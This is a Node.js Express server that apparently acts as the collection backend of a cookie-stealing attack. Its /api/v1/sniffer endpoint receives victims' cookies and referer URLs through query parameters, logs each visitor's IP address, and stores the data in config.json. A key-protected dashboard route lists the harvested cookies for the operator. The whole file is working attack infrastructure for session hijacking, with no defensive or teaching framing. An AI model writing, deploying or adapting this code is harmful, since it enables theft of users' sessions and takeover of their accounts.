var express = require('express');
var session = require('cookie-session');
var path = require('path');
var chalk = require('chalk');
var ejs = require('ejs');
var fs = require('fs');
var bodyParser = require('body-parser')
var cookieParser = require('cookie-parser')
var config = JSON.parse(fs.readFileSync('config.json'));
var app = express();

class Main {
    static PushLogs( ip, cookies, referer ) {
        var data = fs.readFileSync('config.json', 'utf8');
        var parsed_data = JSON.parse(data);

        parsed_data.logs.push({
            tmp_id: 0,
            ip: ip,
            cookies: cookies,
            referer: referer,
            timestamp: new Date()
        });

        fs.writeFileSync('config.json', JSON.stringify(parsed_data))
    }

    static GetLogs( ip, cookies, referer ) {
        var data = fs.readFileSync('config.json', 'utf8');
        var parsed_data = JSON.parse(data);
        return parsed_data.logs;
    }

    static formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
        '] ';
    }
}

app.set('views', './views');
app.set('view engine', 'ejs');

app.use(express.static('public'))
app.use(express.static('files'))
app.use(bodyParser.json())
app.use(express.static('./public'));;
app.use(cookieParser());
app.use(session({
    secret: 'express-session',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: true }
}))

app.post('/api/v1/auth', function(request, response) {
    var json_data = request.body
    var auth_key = json_data.auth_key;
    if (auth_key) {
        if (auth_key == config.credentials.auth_key) {
            request.session.loggedin = true;
            request.session.auth_key = auth_key;
            console.log(chalk.hex('#d6af42')(Main.formatConsoleDate(new Date())) + ` ${chalk.green('New user connected')}`)
            response.send(JSON.stringify({
                "error": null,
                "code":"2001"
            }));
        }else{
            response.send(JSON.stringify({
                "error": "Wrong username or password",
                "code":"4078"
            }));  
        }
    } else {
        response.send(JSON.stringify({
            "error": "Wrong username or password",
            "code":"4078"
        }));
    }
    response.end();
});

app.get('/api/v1/sniffer',function (request, response) {
    console.log(request.query)
    console.log(chalk.hex('#d6af42')(Main.formatConsoleDate(new Date())) + ` ${chalk.green('New cookies logged')} : 
    Ip => ${request.connection.remoteAddress}, 
    ${request.query.cookies.split(";").length} cookie(s) => ${JSON.stringify(request.query.cookies)}, 
    Referer => ${request.query.pos}
    `)

    Main.PushLogs( 
        request.connection.remoteAddress,
        request.query.cookies,
        request.query.pos
    )
    response.end();
});

app.get('/api/v1/logs',function (request, response) {
    if (request.session.loggedin) {
        var increment = 0;
        var array = [];
        Main.GetLogs().forEach( (item) => {
            item.tmp_id = ++increment;
            item.cookies.pos = undefined;
            array.push(item)
        });
        response.send(JSON.stringify(array));
    }else{
        response.send(JSON.stringify({
            "error": "User disconnected",
            "code":"4004"
        }));  
    }
    response.end();
});

app.get('/auth/login',function (request, response) {
    if (request.session.loggedin) {
        response.redirect('/');
    }else{
        response.render('auth/login');
    }
    response.end();
});

app.get('/auth/logout',function (request, response) {
    request.session.loggedin = undefined;
    response.render('auth/login');
    response.end();
});

app.get('/',function (request, response) {
    if (request.session.loggedin) {
        response.render('index');
    }else{
        response.redirect('/auth/login');
    }
    response.end();
});

app.listen(3000, () => {
    console.log(chalk.hex('#d6af42')(Main.formatConsoleDate(new Date())) + ` ${chalk.green('Server listening port')} ${chalk.bgMagenta(chalk.yellow('3000'))}`)
});